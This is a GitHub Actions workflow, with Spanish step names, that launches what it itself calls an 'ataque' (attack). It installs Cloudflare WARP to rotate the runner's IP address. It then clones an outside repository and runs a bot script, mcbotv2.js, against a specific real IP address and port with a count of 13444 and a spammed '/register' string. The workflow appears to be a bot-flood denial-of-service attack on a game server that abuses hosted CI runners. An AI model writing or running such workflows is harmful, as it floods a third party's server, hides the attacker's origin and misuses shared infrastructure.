name: Ata1a
on:
  workflow_dispatch:

jobs:
  anak:
    runs-on: ubuntu-latest
    timeout-minutes: 1
    
    steps:
      - name: Instalar y conectar Cloudflare Warp (para rotar IP)
        run: |
          curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor -o /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
          echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
          sudo apt-get update -y
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y cloudflare-warp
          (sudo nohup warp-svc > /dev/null 2>&1 &)
          sleep 3
          yes | sudo warp-cli --accept-tos registration new
          sudo warp-cli --accept-tos connect
          sudo warp-cli --accept-tos mode warp+doh
          echo -n "Tu IP final es: "
          curl -s ifconfig.me
          echo ""
          
      - name: Clonar repositorio
        run: |
          git clone https://github.com/ricardocraft121-gif/ssh2.git
          
      - name: Entrar y ejecutar ataque
        run: |
          cd ssh2
          timeout 25 node mcbotv2.js 45.126.208.51 25575 13444 25 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
          
      - name: Limpiar
        if: always()
        run: |
          echo "✅ Ataque completado después de 20 segundos"
          sleep 2
